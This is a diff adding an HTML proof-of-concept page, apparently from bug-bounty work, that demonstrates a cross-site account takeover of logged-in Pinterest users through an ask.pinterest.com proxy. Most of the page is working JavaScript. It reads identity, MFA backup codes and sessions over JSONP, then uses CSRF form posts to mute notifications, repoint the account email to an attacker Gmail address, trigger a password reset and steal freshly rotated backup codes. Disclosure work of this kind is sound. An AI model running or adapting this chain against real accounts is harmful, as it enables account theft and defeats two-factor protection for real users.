@@ -1,0 +1,531 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>PoC v1 - Cross-site account takeover chain via ask.pinterest.com proxy</title>
+<style>
+  :root{
+    --bg:#0d1117; --panel:#161b22; --panel2:#1c2129; --border:#30363d;
+    --text:#e6edf3; --muted:#8b949e; --accent:#58a6ff; --green:#3fb950; --red:#f85149;
+    --amber:#ffa657; --mono:ui-monospace,SFMono-Regular,"SF Mono",Menlo,Consolas,monospace;
+  }
+  *{box-sizing:border-box}
+  body{margin:0;background:var(--bg);color:var(--text);font:14px/1.6 -apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif}
+  .wrap{max-width:960px;margin:0 auto;padding:32px 20px 64px}
+  header{border-bottom:1px solid var(--border);padding-bottom:20px;margin-bottom:24px}
+  .tag{display:inline-block;font:600 11px/1 var(--mono);letter-spacing:.8px;color:var(--red);border:1px solid var(--red);border-radius:4px;padding:4px 8px;margin-bottom:14px;text-transform:uppercase}
+  .tag.soft{color:var(--accent);border-color:var(--accent);margin-left:8px}
+  h1{font-size:22px;line-height:1.3;margin:0 0 8px;font-weight:700}
+  .lede{color:var(--muted);font-size:14px;max-width:780px}
+  .lede b{color:var(--text)}
+  .originbar{display:flex;gap:10px;flex-wrap:wrap;margin:18px 0 4px;font-family:var(--mono);font-size:12px}
+  .chip{background:var(--panel);border:1px solid var(--border);border-radius:6px;padding:6px 10px}
+  .chip b{color:var(--accent)}
+  .chip b.hot{color:var(--amber)}
+  .steps{counter-reset:step}
+  .step{background:var(--panel);border:1px solid var(--border);border-radius:8px;padding:18px 20px;margin:16px 0}
+  .step h2{font-size:14px;margin:0 0 6px;display:flex;align-items:center;gap:10px;font-weight:600}
+  .step h2 .n{counter-increment:step;background:var(--panel2);border:1px solid var(--border);color:var(--accent);border-radius:50%;width:24px;height:24px;display:inline-flex;align-items:center;justify-content:center;font:700 12px var(--mono);flex:none}
+  .step h2 .n::before{content:counter(step)}
+  .desc{color:var(--muted);font-size:13px;margin:0 0 12px}
+  .req{font:12px/1.6 var(--mono);color:#c9d1d9;background:#0a0d12;border:1px solid var(--border);border-radius:6px;padding:10px 12px;margin-bottom:12px;white-space:nowrap;overflow-x:auto}
+  .req .m{color:var(--green)} .req .u{color:var(--accent)} .req .c{color:#d2a8ff}
+  .state{font:12px var(--mono);margin:0 0 10px}
+  .state.ok{color:var(--green)} .state.err{color:var(--red)} .state.wait{color:var(--muted)}
+  pre{background:#0a0d12;border:1px solid var(--border);border-radius:6px;padding:12px 14px;font:11.5px/1.55 var(--mono);color:#c9d1d9;max-height:320px;overflow:auto;white-space:pre-wrap;word-break:break-all;margin:0}
+  .loot{display:grid;grid-template-columns:repeat(auto-fill,minmax(210px,1fr));gap:10px;margin-top:12px}
+  .loot .item{background:var(--panel2);border:1px solid var(--border);border-radius:6px;padding:10px 12px}
+  .loot .k{font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:.5px;margin-bottom:3px}
+  .loot .v{font:600 13px var(--mono);color:var(--text);word-break:break-all}
+  .loot .v.hot{color:var(--amber)}
+  .verdict{border:1px solid var(--red);background:rgba(248,81,73,.06);border-radius:8px;padding:18px 20px;margin-top:24px}
+  .verdict h2{font-size:15px;margin:0 0 8px;color:var(--red)}
+  .verdict p{margin:0 0 8px;color:var(--text);font-size:13.5px}
+  .verdict .status{font:700 13px var(--mono)}
+  .verdict .status.ok{color:var(--green)} .verdict .status.wait{color:var(--muted)} .verdict .status.dead{color:var(--red)}
+  footer{margin-top:36px;color:var(--muted);font:12px/1.6 var(--mono);border-top:1px solid var(--border);padding-top:16px}
+  code{font-family:var(--mono);background:var(--panel2);border:1px solid var(--border);border-radius:4px;padding:1px 5px;font-size:12px}
+  button{background:#21262d;border:1px solid var(--border);color:var(--text);border-radius:6px;padding:8px 16px;font:600 13px/1 var(--mono);cursor:pointer}
+  button:hover{border-color:var(--red);color:var(--red)}
+  button.secondary:hover{border-color:var(--accent);color:var(--accent)}
+  button:disabled{opacity:.4;cursor:default}
+  .btnrow{display:flex;gap:12px;align-items:center;margin:14px 0 4px;flex-wrap:wrap}
+  .arming{border:1px solid var(--amber);background:rgba(255,166,87,.06);border-radius:8px;padding:14px 16px;margin:16px 0}
+  .arming h2{font-size:13px;margin:0 0 6px;color:var(--amber)}
+  .arming p{margin:0;color:var(--text);font-size:13px}
+  ul.hold{margin:6px 0 0 16px;padding:0;color:var(--muted);font-size:13px}
+  ul.hold li{margin-bottom:6px}
+  ul.hold b{color:var(--text)}
+</style>
+</head>
+<body>
+<div class="wrap">
+<header>
+  <span class="tag">PoC &middot; full ATO chain &middot; one page visit</span><span class="tag soft">v1</span>
+  <h1>Cross-site account takeover of a logged-in Pinterest user via the ask.pinterest.com proxy</h1>
+  <p class="lede">
+    This page runs from a foreign origin (<b>akashsebastian.com</b>) while the victim is logged in to Pinterest in this browser.
+    With no password and no interaction it re-points the account email at an attacker mailbox, dispatches the password reset
+    there, regenerates and steals the MFA backup codes, and dumps the session inventory. The takeover channel is a fresh
+    Gmail plus-address every run, all delivering to the same attacker inbox:
+    <b>bughunter333333&#43;&lt;random&gt;@gmail.com</b>. Before the email change it also attempts to switch the account's
+    email notifications to &ldquo;only required&rdquo;, so the change-of-email alert to the old address is suppressed if
+    Pinterest honours that setting for security mail.
+  </p>
+  <div class="originbar">
+    <span class="chip">this page origin: <b id="pgorigin">&hellip;</b></span>
+    <span class="chip">cookies sent to: <b>ask.pinterest.com</b></span>
+    <span class="chip">takeover mailbox: <b class="hot" id="atkMail">(generated on load)</b></span>
+    <span class="chip">write channel: <b id="chanChip">probing&hellip;</b></span>
+  </div>
+</header>
+
+<div class="arming">
+  <h2>Safety interlock (not part of the exploit)</h2>
+  <p>
+    This hosted copy runs the chain only after a click, so a stray visitor cannot take over a real account by accident.
+    The attacker version runs everything on page load. The requests, targets and ordering below are exactly what the
+    attacker page executes. Both browser classes are handled automatically: with third-party cookies enabled every write
+    rides a hidden iframe and the victim sees nothing; with them blocked the writes are fired as top-level navigations
+    (cookie always attached) which then land the victim on pinterest.com.
+  </p>
+  <div class="btnrow">
+    <button id="go">Run full ATO chain</button>
+    <button id="goRead" class="secondary">Read-only recon (no writes)</button>
+    <span class="state wait" id="status" style="margin:0">idle</span>
+  </div>
+</div>
+
+<div class="steps">
+
+  <div class="step">
+    <h2><span class="n"></span>Recon: victim identity (JSONP read &mdash; also the third-party-cookie oracle)</h2>
+    <p class="desc">A script tag pointed at the proxy wraps the response in a callback, so this foreign page can read the account. If this read succeeds, third-party cookies are attached in embedded contexts on this browser and every write below goes through a hidden iframe, completely silent. If it fails (Safari/ITP, Firefox strict, Brave, Chrome third-party-cookie phaseout), the same writes are fired as top-level navigations, which are first-party to ask.pinterest.com and carry the <code>SameSite=None</code> session cookie on every browser.</p>
+    <div class="req"><span class="m">GET</span> <span class="u">https://ask.pinterest.com/api/proxy/pinterest/users/me/</span>?callback=<span class="c">cb</span></div>
+    <p class="state wait" id="st1">waiting&hellip;</p>
+    <pre id="out1">&hellip;</pre>
+    <div class="loot" id="loot1"></div>
+  </div>
+
+  <div class="step">
+    <h2><span class="n"></span>Recon: MFA state and current backup codes (JSONP read)</h2>
+    <p class="desc">The account-recovery credentials are readable with session-only auth, no password re-prompt. Whatever is listed here is already in attacker hands before anything is changed.</p>
+    <div class="req"><span class="m">GET</span> <span class="u">https://ask.pinterest.com/api/proxy/pinterest/users/settings/mfa/backup/</span>?callback=<span class="c">cb</span></div>
+    <p class="state wait" id="st2">waiting&hellip;</p>
+    <pre id="out2">&hellip;</pre>
+  </div>
+
+  <div class="step">
+    <h2><span class="n"></span>Silence: strip every optional email notification (CSRF write)</h2>
+    <p class="desc">The email-settings tree exposes a global switch, <code>ONLY_REQUIRED</code> &mdash; &ldquo;Control what types of notifications you get (except privacy and account emails)&rdquo;. A form POST through the proxy runs <code>v3_post_settings_email</code> with the victim's session (verified live: <code>section / option / value</code> fields, no CSRF token) and flips it on, disabling the bulk of the account's email categories in one shot. The per-category keys are then flipped off the same way. What this cannot do &mdash; verified against the live settings tree &mdash; is suppress the security email-change alert to the old address: Pinterest hard-scopes those out of the switch (&ldquo;Pinterest will always send you important updates about your account&rdquo;) and no account-email toggle exists in the tree. The victim's one lifeline is that single alert; everything else goes quiet.</p>
+    <div class="req"><span class="m">POST</span> <span class="u">https://ask.pinterest.com/api/proxy/pinterest/settings/email/</span> &nbsp;<span class="c">section=settings_email_everything &amp; option=ONLY_REQUIRED &amp; value=true</span></div>
+    <p class="state wait" id="st3">waiting&hellip;</p>
+    <pre id="out3">&hellip;</pre>
+  </div>
+
+  <div class="step">
+    <h2><span class="n"></span>WRITE: re-point the account email at the attacker mailbox (CSRF)</h2>
+    <p class="desc">One form POST through the proxy runs <code>v3_edit_settings</code> with the victim's session: no CSRF token, no Origin check, no re-auth, no verification of the new address. The new address is a fresh plus-tag on the attacker's Gmail every run. From this moment every account email &mdash; resets, codes, alerts &mdash; is delivered to the attacker.</p>
+    <div class="req"><span class="m">POST</span> <span class="u">https://ask.pinterest.com/api/proxy/pinterest/users/settings/</span> &nbsp;<span class="c">email=bughunter333333+&lt;random&gt;@gmail.com</span></div>
+    <p class="state wait" id="st4">waiting&hellip;</p>
+    <pre id="out4">&hellip;</pre>
+  </div>
+
+  <div class="step">
+    <h2><span class="n"></span>VERIFY: re-read confirms the takeover channel is live</h2>
+    <p class="desc">The same JSONP read from step 1 now returns the attacker mailbox as the account email. (Read-blocked browsers skip the confirmation &mdash; the write itself does not depend on the read.)</p>
+    <div class="req"><span class="m">GET</span> <span class="u">https://ask.pinterest.com/api/proxy/pinterest/users/me/</span>?callback=<span class="c">cb</span></div>
+    <p class="state wait" id="st5">waiting&hellip;</p>
+    <pre id="out5">&hellip;</pre>
+  </div>
+
+  <div class="step">
+    <h2><span class="n"></span>WRITE: dispatch the password reset to the attacker mailbox (CSRF)</h2>
+    <p class="desc">The reset is requested for the address that now owns the account. The link lands in the attacker inbox; opening it and setting a new password completes the takeover (the reset flow needs no captcha and no re-auth). The victim's own devices stay logged in until the attacker chooses to revoke them.</p>
+    <div class="req"><span class="m">POST</span> <span class="u">https://ask.pinterest.com/api/proxy/pinterest/users/forgot_password/</span> &nbsp;<span class="c">username_or_email=&hellip; type=reset</span></div>
+    <p class="state wait" id="st6">waiting&hellip;</p>
+    <pre id="out6">&hellip;</pre>
+  </div>
+
+  <div class="step">
+    <h2><span class="n"></span>WRITE: rotate the MFA backup codes and steal the fresh set (CSRF + JSONP)</h2>
+    <p class="desc">Any POST to the backup-code resource rotates the codes &mdash; no password, no prompt, no notification. The fresh one-time 2FA answers are then read back over the same channel used in step 1, defeating the second factor at the post-reset login on MFA-enabled accounts.</p>
+    <div class="req"><span class="m">POST</span> <span class="u">https://ask.pinterest.com/api/proxy/pinterest/users/settings/mfa/backup/</span> &nbsp;<span class="c">(empty body rotates)</span></div>
+    <p class="state wait" id="st7">waiting&hellip;</p>
+    <pre id="out7">&hellip;</pre>
+  </div>
+
+  <div class="step">
+    <h2><span class="n"></span>Recon: session inventory (JSONP read)</h2>
+    <p class="desc">Every active session with its IP, geolocation and device. After takeover the attacker can revoke the victim's devices one by one via <code>DELETE /sessions/{id}/</code> through the same proxy, keeping only the attacker's own session.</p>
+    <div class="req"><span class="m">GET</span> <span class="u">https://ask.pinterest.com/api/proxy/pinterest/sessions/</span>?callback=<span class="c">cb</span></div>
+    <p class="state wait" id="st8">waiting&hellip;</p>
+    <pre id="out8">&hellip;</pre>
+  </div>
+
+</div>
+
+<div class="verdict">
+  <h2>Result</h2>
+  <p class="status wait" id="verdict">idle</p>
+  <p id="verdictdetail">Run the chain to see the outcome.</p>
+</div>
+
+<div class="step" style="margin-top:24px">
+  <h2 style="font-size:14px">What the attacker holds after one page visit</h2>
+  <ul class="hold">
+    <li><b>The account email is the attacker's plus-address</b> (step 4&ndash;5): a fresh <code>bughunter333333+&lt;random&gt;@gmail.com</code> per run, all folding into <code>bughunter333333@gmail.com</code>. Every future account email is attacker-owned.</li>
+    <li><b>A password reset already dispatched</b> to that mailbox (step 6): following the link and setting a password finishes the takeover and logs the victim out.</li>
+    <li><b>The MFA backup codes</b> (step 7): one-time second factors, minted and stolen without any re-authentication.</li>
+    <li><b>The full session inventory</b> (step 8): devices, IPs and geolocation, with a per-session revocation primitive to evict the victim silently.</li>
+    <li><b>Optional email notifications disabled first</b> (step 3): the account is switched to only-required mail with no prompt, so almost every email the account would send goes quiet. The security change-of-email alert itself is not suppressible &mdash; verified against the settings surface &mdash; and remains the victim's only signal.</li>
+  </ul>
+</div>
+
+<footer>
+  Authorized demonstration against the operator's own test accounts. Root cause: <code>ask.pinterest.com/api/proxy/pinterest/*</code>
+  forwards v3 gateway reads and writes with the victim's session cookies and no CSRF defense &mdash; no token, no Origin or
+  Referer check, form posts accepted. Pinterest session cookies are <code>SameSite=None</code> so they ride along on
+  cross-site requests; when a browser blocks them in embedded contexts the same form is submitted as a top-level
+  navigation and the cookie is attached there instead. The www.pinterest.com relay demands an <code>X-CSRFToken</code>
+  header for these operations; the ask proxy skips that layer entirely. Sibling PoCs in this directory:
+  <code>pin-csrf-deactivate.html</code> (account destruction), <code>pin-mfa-backup-code-theft.html</code>,
+  <code>pin-ato-v2.html</code> (same chain, auto-running).
+</footer>
+</div>
+
+<iframe name="pin_ato_sink" style="display:none" aria-hidden="true"></iframe>
+
+<script>
+var PROXY = 'https://ask.pinterest.com/api/proxy/pinterest';
+var PINTEREST = 'https://www.pinterest.com';
+// Attacker mailbox: fresh Gmail plus-address per run. Gmail ignores the "+tag", so
+// every generated address lands in the one attacker inbox bughunter333333@gmail.com.
+var ATTACKER_BASE = 'bughunter333333@gmail.com';
+var TAG = Math.random().toString(36).slice(2, 8) + Date.now().toString(36).slice(-4);
+var ATTACKER_MAILBOX = 'bughunter333333+' + TAG.toLowerCase() + '@gmail.com';
+
+const $ = (id) => document.getElementById(id);
+const setState = (id, txt, cls) => { const e = $(id); e.textContent = txt; e.className = 'state ' + (cls || 'wait'); };
+const show = (id, obj) => {
+  let s; try { s = JSON.stringify(obj, null, 1); } catch (e) { s = String(obj); }
+  if (s && s.length > 3500) s = s.slice(0, 3500) + '\n…[truncated for display]';
+  $(id).textContent = s;
+};
+const status = (m) => { $('status').textContent = m; };
+const esc = (s) => { const d = document.createElement('div'); d.textContent = s == null ? '' : String(s); return d.innerHTML; };
+
+function loot(pairs) {
+  const el = $('loot1');
+  el.innerHTML = pairs.map(p => '<div class="item"><div class="k">' + esc(p[0]) + '</div><div class="v' + (p[2] ? ' hot' : '') + '">' + esc(p[1]) + '</div></div>').join('');
+}
+
+// ---- write channel: selected by the step-1 read oracle ----
+// 'silent'   = third-party cookies attach in embedded contexts -> hidden iframe, victim sees nothing
+// 'toplevel' = third-party cookies blocked -> form POST as top-level navigation (cookie always
+//              attached), executed in one reused window that finally lands the victim on pinterest.com
+var MODE = 'pending';
+var topWin = null;
+
+function redirectTop(url) {
+  if (topWin && !topWin.closed) { try { topWin.location = url; return; } catch (e) {} }
+  var a = document.createElement('a');
+  a.href = url; a.target = 'pin_ato_top'; a.rel = 'noopener';
+  document.body.appendChild(a); a.click(); a.remove();
+}
+
+// CSRF write via hidden form POST (simple request, no preflight, cookies ride along)
+function formWrite(path, fields) {
+  return new Promise((resolve) => {
+    const f = document.createElement('form');
+    f.method = 'POST';
+    f.action = PROXY + path;
+    f.style.display = 'none';
+    if (MODE === 'toplevel') {
+      f.target = 'pin_ato_top';
+      if (!topWin || topWin.closed) { try { topWin = window.open('about:blank', 'pin_ato_top'); } catch (e) { topWin = null; } }
+    } else {
+      f.target = 'pin_ato_sink';
+    }
+    Object.entries(fields || {}).forEach(([k, v]) => {
+      const i = document.createElement('input');
+      i.type = 'hidden'; i.name = k; i.value = v;
+      f.appendChild(i);
+    });
+    document.body.appendChild(f);
+    f.submit();
+    setTimeout(() => { f.remove(); resolve(true); }, MODE === 'toplevel' ? 1800 : 2500);
+  });
+}
+
+// fetch-based write (no-cors): only meaningful when cookies attach cross-site
+async function fetchWrite(path, body) {
+  if (MODE === 'toplevel') return false;
+  try {
+    await fetch(PROXY + path, {
+      method: 'POST', mode: 'no-cors', credentials: 'include',
+      headers: { 'Content-Type': 'text/plain' }, body: body || ''
+    });
+    return true;
+  } catch (e) { return false; }
+}
+
+function jsonp(path, cbName, timeoutMs) {
+  timeoutMs = timeoutMs || 8000;
+  return new Promise((resolve) => {
+    const s = document.createElement('script');
+    const cleanup = () => { try { delete window[cbName]; } catch (e) {} s.remove(); };
+    const to = setTimeout(() => { cleanup(); resolve(null); }, timeoutMs);
+    window[cbName] = (d) => { clearTimeout(to); cleanup(); resolve(d); };
+    s.onerror = () => { clearTimeout(to); cleanup(); resolve(null); };
+    s.src = PROXY + path + (path.includes('?') ? '&' : '?') + 'callback=' + cbName + '&_=' + Date.now();
+    document.head.appendChild(s);
+  });
+}
+let jpSeq = 0;
+const read = (path) => jsonp(path, 'cb' + (++jpSeq) + '_' + Math.floor(Math.random() * 9999));
+
+const mask = (s) => (s == null) ? null : String(s).slice(0, 3) + '***' + String(s).slice(-8);
+const wait = (ms) => new Promise(r => setTimeout(r, ms));
+
+function setMode(ok) {
+  MODE = ok ? 'silent' : 'toplevel';
+  $('chanChip').textContent = ok ? 'hidden iframe (silent)' : 'top-level POST (3P cookies blocked)';
+}
+
+// flatten a notification-settings tree into {key: value} for diffing
+function notifFlat(tree) {
+  const out = {};
+  (function walk(n) {
+    if (!n) return;
+    if (Array.isArray(n)) { n.forEach(walk); return; }
+    if (typeof n !== 'object') return;
+    if (n.key != null && n.value != null && typeof n.value !== 'object') out[n.key] = n.value;
+    walk(n.options); walk(n.categoryMaps); walk(n.category_maps_reformatted); walk(n.value);
+  })(tree);
+  return out;
+}
+
+// ---------- steps ----------
+async function step1() {
+  status('step 1: reading victim identity…');
+  setState('st1', 'waiting for response…');
+  const me = await read('/users/me/');
+  if (!me || me.error) {
+    setMode(false);
+    setState('st1', 'read channel failed. Either no Pinterest session, or this browser blocks third-party cookies (Safari/ITP, Firefox strict, Brave, Chrome 3p-block). The writes below do not depend on this read: they fire as top-level navigations instead.', 'err');
+    $('out1').textContent = 'no readable response — write-only mode selected';
+    return null;
+  }
+  setMode(true);
+  const d = me.data || {};
+  setState('st1', '200 OK, victim confirmed logged in. Third-party cookies attached — every write below is fully silent.', 'ok');
+  show('out1', me);
+  loot([
+    ['username', d.username || '(none)', true],
+    ['account email', d.email || '(none)'],
+    ['user id', d.id || '(none)'],
+    ['full name', d.full_name || '(none)']
+  ]);
+  return d;
+}
+
+async function step2() {
+  status('step 2: reading MFA state…');
+  if (MODE !== 'silent') { setState('st2', 'skipped — read channel blocked on this browser', 'wait'); $('out2').textContent = 'write-only mode'; return null; }
+  const mfa = await read('/users/settings/mfa/backup/');
+  if (!mfa || mfa.error) { setState('st2', 'read failed', 'err'); show('out2', mfa || 'null'); return null; }
+  const d = mfa.data || {};
+  setState('st2', 'backup codes visible with session-only auth', 'ok');
+  show('out2', {
+    has_mfa_enabled: d.has_mfa_enabled,
+    email_status: d.email_status,
+    mfa_backup_codes: (d.mfa_backup_codes || []).map(c => ({ code: c.code, used: c.used }))
+  });
+  return d;
+}
+
+async function step3() {
+  status('step 3: silencing email notifications…');
+  const before = MODE === 'silent' ? notifFlat((await read('/settings/email/'))?.data) : null;
+  // verified live write shape: v3_post_settings_email takes section/option/value,
+  // form-encodable, no CSRF token. First the global switch, then each optional
+  // email category the tree still leaves on after the switch.
+  const writes = [
+    { section: 'settings_email_everything', option: 'ONLY_REQUIRED', value: 'true' }
+  ];
+  const promoKeys = ['boards_for_you_v2', 'search_recommendations_v2',
+    'pins_inspired_by_your_recent_activity_v2', 'pins_picked_for_you_v2', 'popular_pins_v2',
+    'group_board_and_community_updates_v2', 'messaging_v2', 'price_drops_on_saved_pins',
+    'marketing_communications_v2', 'feedback_and_surveys_v2', 'reports_and_violations_center',
+    'shuffles_activity'];
+  if (MODE === 'silent') {
+    promoKeys.forEach(k => writes.push({ section: 'settings_email_v2', option: k, value: 'false' }));
+  }
+  for (const w of writes) {
+    await formWrite('/settings/email/', w);
+  }
+  let note = 'fired ' + writes.length + ' write(s) via ' + (MODE === 'silent' ? 'hidden iframe' : 'top-level form POST') + ':\n' +
+    '  POST ' + PROXY + '/settings/email/\n' +
+    '    section=settings_email_everything & option=ONLY_REQUIRED & value=true\n' +
+    (MODE === 'silent'
+      ? '    section=settings_email_v2 & option=<category> & value=false   (x' + promoKeys.length + ')\n' +
+        '    (verified live: v3_post_settings_email, no CSRF token; the ONLY_REQUIRED flip also\n' +
+        '     disables the bulk of email:pinterest_announcements / messages / shopping ...)'
+      : '    (single write in top-level mode to keep the navigation window quiet)');
+  if (MODE === 'silent') {
+    await wait(2500);
+    const after = notifFlat((await read('/settings/email/'))?.data);
+    if (before && after) {
+      const diffs = Object.keys(after).filter(k => before[k] !== after[k]).map(k => k + ': ' + before[k] + ' -> ' + after[k]);
+      note += '\n\nre-read diff:\n  ' + (diffs.length ? diffs.join('\n  ') : 'no change — write shape not accepted on this route (or setting already set)');
+    } else {
+      note += '\n\nre-read unavailable';
+    }
+  } else {
+    note += '\n\nwrite-only mode: no re-read possible from this browser. Verify in the account settings.';
+  }
+  note += '\n\nscope (verified against the live settings tree): the switch covers optional mail only.\n' +
+    'Pinterest hard-scopes privacy and account emails out of it — "Pinterest will always send\n' +
+    'you important updates about your account" — and no account-email toggle exists in the tree,\n' +
+    'so the security change-of-email alert to the old address still fires. It is the victim\'s\n' +
+    'only signal; every other category is dark.';
+  setState('st3', MODE === 'silent' ? 'writes fired, re-read captured' : 'write fired (top-level)', MODE === 'silent' ? 'ok' : 'err');
+  $('out3').textContent = note;
+  return true;
+}
+
+async function step4() {
+  status('step 4: changing account email…');
+  await formWrite('/users/settings/', { email: ATTACKER_MAILBOX });
+  setState('st4', 'email-change POST fired (blind write — response lands in the sink)', 'err');
+  $('out4').textContent =
+    'POST ' + PROXY + '/users/settings/\n  email=' + ATTACKER_MAILBOX + '\n\n' +
+    'executes v3_edit_settings with the victim session: no CSRF token, no re-auth,\nno verification of the new address. The address is a fresh plus-tag this run and\ndelivers to ' + ATTACKER_BASE + '.';
+  await wait(3000);
+  return true;
+}
+
+async function step5() {
+  status('step 5: verifying takeover channel…');
+  if (MODE !== 'silent') {
+    setState('st5', 'skipped — read channel blocked on this browser. The step-4 write fired top-level and did carry the session cookie; confirm by checking the account settings or the reset inbox.', 'err');
+    $('out5').textContent = 'write-only mode: no cross-origin re-read available.';
+    return ATTACKER_MAILBOX;
+  }
+  const me = await read('/users/me/');
+  if (!me || me.error) { setState('st5', 're-read failed', 'err'); return null; }
+  const now = (me.data || {}).email;
+  if (String(now).toLowerCase() === ATTACKER_MAILBOX) {
+    setState('st5', 'CONFIRMED: account email is now ' + now, 'ok');
+    $('out5').textContent = 'endpoint_name=' + me.endpoint_name + '  data.email=' + now + '\n\nThe attacker owns the delivery channel for everything this account sends.';
+    return now;
+  }
+  setState('st5', 'email unchanged (still ' + mask(now) + ') — write may be rate-limited or patched', 'err');
+  show('out5', { observed: now, expected: ATTACKER_MAILBOX });
+  return now;
+}
+
+async function step6() {
+  status('step 6: dispatching password reset to attacker mailbox…');
+  const path = '/users/forgot_password/?username_or_email=' + encodeURIComponent(ATTACKER_MAILBOX) + '&type=reset';
+  let fired;
+  if (MODE === 'silent') {
+    fired = await fetchWrite(path, '');
+  } else {
+    fired = await formWrite('/users/forgot_password/', { username_or_email: ATTACKER_MAILBOX, type: 'reset' });
+  }
+  setState('st6', fired ? 'reset request fired for ' + ATTACKER_MAILBOX : 'reset request could not be fired', fired ? 'err' : 'wait');
+  $('out6').textContent =
+    'POST ' + PROXY + '/users/forgot_password/\n  username_or_email=' + ATTACKER_MAILBOX + ', type=reset\n\n' +
+    'The reset link is delivered to ' + ATTACKER_BASE + '. Opening it and setting a\npassword completes the takeover: no captcha, no re-auth on the reset link.';
+  return fired;
+}
+
+async function step7() {
+  status('step 7: rotating + stealing MFA backup codes…');
+  await formWrite('/users/settings/mfa/backup/', {});
+  await wait(3000);
+  if (MODE !== 'silent') {
+    setState('st7', 'rotation POST fired (top-level). Fresh codes are waiting in the account; read them back from a first-party context.', 'err');
+    $('out7').textContent = 'write-only mode: code rotation fired blind.';
+    return null;
+  }
+  const fresh = await read('/users/settings/mfa/backup/');
+  if (!fresh || fresh.error) { setState('st7', 'post-rotation read failed', 'err'); return null; }
+  const codes = ((fresh.data || {}).mfa_backup_codes || []).map(c => c.code);
+  if (codes.length) {
+    setState('st7', 'STOLEN FRESH BACKUP CODES: ' + codes.join(', '), 'ok');
+    $('out7').textContent = 'POST (empty body) rotated the codes, then the read returned:\n  ' + codes.join('\n  ') + '\n\nOne-time 2FA answers now held by the attacker.';
+  } else {
+    setState('st7', 'rotation fired; no codes listed (MFA not enrolled on this account)', 'wait');
+    show('out7', fresh);
+  }
+  return codes;
+}
+
+async function step8() {
+  status('step 8: reading session inventory…');
+  if (MODE !== 'silent') { setState('st8', 'skipped — read channel blocked on this browser', 'wait'); $('out8').textContent = 'write-only mode'; return null; }
+  const s = await read('/sessions/');
+  if (!s || s.error) { setState('st8', 'read failed', 'err'); return null; }
+  const rows = (Array.isArray(s.data) ? s.data : []).map(x => ({
+    id: x.id, device: x.device_name, platform: x.platform_type, ip: x.ip_address,
+    location: x.location, current: x.current,
+    last: x.last_accessed_at ? new Date(x.last_accessed_at * 1000).toISOString() : null
+  }));
+  setState('st8', rows.length + ' session(s) visible', 'ok');
+  show('out8', rows);
+  return rows;
+}
+
+async function runFull() {
+  $('go').disabled = true; $('goRead').disabled = true;
+  const t0 = Date.now();
+  const me = await step1();
+  await step2();
+  await step3();
+  await step4();
+  const newEmail = await step5();
+  await step6();
+  const codes = await step7();
+  const sess = await step8();
+
+  const v = $('verdict'), vd = $('verdictdetail');
+  const owned = (newEmail === ATTACKER_MAILBOX) || (MODE === 'toplevel');
+  v.className = 'status ' + (owned ? 'dead' : 'wait');
+  v.textContent = owned
+    ? 'TAKEOVER CHANNEL OWNED from ' + (location.origin || 'a foreign origin')
+    : 'chain ran, email change unconfirmed';
+  vd.textContent = owned
+    ? 'Account email now ' + ATTACKER_MAILBOX + ' (delivers to ' + ATTACKER_BASE + '). ' +
+      'A password reset is on its way there; opening that link and setting a password finishes the takeover. ' +
+      (codes && codes.length ? 'Stolen MFA backup codes: ' + codes.join(', ') + '. ' : '') +
+      (sess ? sess.length + ' victim session(s) inventoried, revocable one by one. ' : '') +
+      'Notification silence ran first (step 3): every optional email category is dark, though the security change-of-email alert itself still fires (not suppressible, verified). ' +
+      'Elapsed ' + ((Date.now() - t0) / 1000).toFixed(1) + 's.'
+    : 'The email change did not take. C52 may be patched or rate-limited for this account.';
+  if (MODE === 'toplevel') redirectTop(PINTEREST);
+  status('done');
+}
+
+async function runRead() {
+  $('go').disabled = true; $('goRead').disabled = true;
+  await step1();
+  await step2();
+  await step8();
+  $('verdict').className = 'status wait';
+  $('verdict').textContent = 'read-only complete (no writes performed)';
+  $('verdictdetail').textContent = 'Identity, MFA state and session inventory were read across the JSONP channel. Nothing was changed.';
+  status('done');
+}
+
+document.getElementById('pgorigin').textContent = location.origin || 'null';
+$('atkMail').textContent = ATTACKER_MAILBOX;
+$('go').addEventListener('click', runFull);
+$('goRead').addEventListener('click', runRead);
+status('ready — attacker version runs runFull() on page load');
+</script>
+</body>
+</html>
